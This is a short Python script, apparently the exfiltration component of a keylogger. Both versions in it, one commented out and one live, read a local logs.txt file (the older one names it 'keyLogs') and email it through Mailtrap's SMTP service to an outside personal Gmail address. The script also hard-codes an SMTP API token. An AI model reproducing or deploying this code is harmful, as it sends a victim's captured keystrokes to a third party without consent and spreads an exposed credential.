
# import smtplib
# from email.message import EmailMessage

# def sendEmail():
#     print("sending")
#     log_file = "logs.txt"
#     with open(log_file, "r") as logFile:
#         keyLogs = logFile.read()

#     sender = "hello@demomailtrap.com"
#     receiver = "ukharbanda20@gmail.com"
    
#     message = EmailMessage()
#     message["Subject"] = "Hi Mailtrap"
#     message["From"] = sender
#     message["To"] = receiver
#     message.set_content(keyLogs)

#     try:
#         with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
#             server.starttls()
#             server.login("api", "c2151af737bd447f8f82331e58edbda8")
#             server.send_message(message)
#         print("Email sent successfully!")
        
#     except smtplib.SMTPDataError as e:
#         print("SMTP Data Error:", e)
#     except smtplib.SMTPException as e:
#         print("SMTP Error:", e)
#     except Exception as e:
#         print("General Error:", e)

# if __name__ == "__main__":
#     sendEmail()


import smtplib
from email.message import EmailMessage

def sendEmail():
    print("sending")
    log_file = "logs.txt"

    sender = "hello@demomailtrap.com"
    receiver = "ukharbanda20@gmail.com"
    
    message = EmailMessage()
    message["Subject"] = "Hi Mailtrap"
    message["From"] = sender
    message["To"] = receiver
    message.set_content("Please find the logs attached.")

    # Attach the log file
    try:
        with open(log_file, "rb") as file:
            file_data = file.read()
            message.add_attachment(file_data, maintype="text", subtype="plain", filename="logs.txt")

        with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
            server.starttls()
            server.login("api", "c2151af737bd447f8f82331e58edbda8")
            server.send_message(message)
        print("Email sent successfully!")
        
    except smtplib.SMTPDataError as e:
        print("SMTP Data Error:", e)
    except smtplib.SMTPException as e:
        print("SMTP Error:", e)
    except Exception as e:
        print("General Error:", e)

if __name__ == "__main__":
    sendEmail()
